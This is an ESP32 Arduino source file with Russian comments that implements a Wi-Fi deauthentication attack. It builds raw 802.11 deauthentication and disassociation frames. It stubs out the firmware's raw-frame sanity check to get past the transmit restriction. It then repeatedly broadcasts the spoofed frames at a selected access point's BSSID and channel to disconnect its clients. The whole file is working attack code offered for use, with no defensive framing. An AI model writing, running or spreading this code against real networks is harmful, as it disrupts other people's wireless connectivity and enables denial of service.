#include "../includes/wifi.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"

// ====================== ГЛОБАЛЬНЫЕ ======================
bool deauthRunning = false;
uint32_t deauthPacketCount = 0;

uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

uint8_t disassFrame[26] = {
    0xA0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x08, 0x00
};

// ====================== СИЛЬНЫЙ BYPASS ======================
extern "C" int ieee80211_raw_frame_sanity_check(uint32_t arg1, uint32_t arg2, uint32_t arg3) {
    return 0;
}

extern "C" int __real_ieee80211_raw_frame_sanity_check(uint32_t a, uint32_t b, uint32_t c);
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(uint32_t a, uint32_t b, uint32_t c) {
    return 0;
}

// ====================== ОТПРАВКА ======================
bool sendRawFrame(const uint8_t* frame, const uint8_t* bssid, uint8_t channel) {
    uint8_t packet[26];
    memcpy(packet, frame, 26);

    memset(&packet[4], 0xFF, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);

    static uint16_t seq = 0;
    uint16_t sequence = (seq++ << 4);
    packet[22] = sequence & 0xFF;
    packet[23] = (sequence >> 8) & 0xFF;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Пробуем разные интерфейсы
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
    if (err != ESP_OK) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
    }

    return (err == ESP_OK);
}

// ====================== INIT ======================
void initDeauth() {
    esp_wifi_init(NULL);
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
}

// ====================== СТАРТ ======================
void startDeauthAttack() {
    if (selectedNet.bssid.length() == 0 || selectedNet.channel == 0) {
        Serial.println("[Deauth] Нет BSSID или Channel!");
        return;
    }

    WiFi.disconnect(true, true);
    delay(150);
    
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(selectedNet.channel, WIFI_SECOND_CHAN_NONE);
    delay(300);

    deauthRunning = true;
    deauthPacketCount = 0;

    Serial.printf("[Deauth] АТАКА → %s | Ch:%d\n", selectedNet.bssid.c_str(), selectedNet.channel);
}

void stopDeauthAttack() {
    deauthRunning = false;
    Serial.println("[Deauth] Остановлено");
}

// ====================== ЦИКЛ ======================
void sendDeauthAttack() {
    if (!deauthRunning) return;

    uint8_t bssid[6];
    if (sscanf(selectedNet.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]) != 6) {
        return;
    }

    bool sent = false;
    for (int i = 0; i < 5; i++) {
        esp_wifi_set_channel(selectedNet.channel, WIFI_SECOND_CHAN_NONE);
        
        if (sendRawFrame(deauthFrame, bssid, selectedNet.channel)) sent = true;
        if (sendRawFrame(disassFrame, bssid, selectedNet.channel)) sent = true;
        
        delayMicroseconds(800);   // очень важно
    }

    if (sent) {
        deauthPacketCount += 10;
        Serial.printf("[+] Deauth+Disassoc sent | Total: %lu\n", deauthPacketCount);
    }
}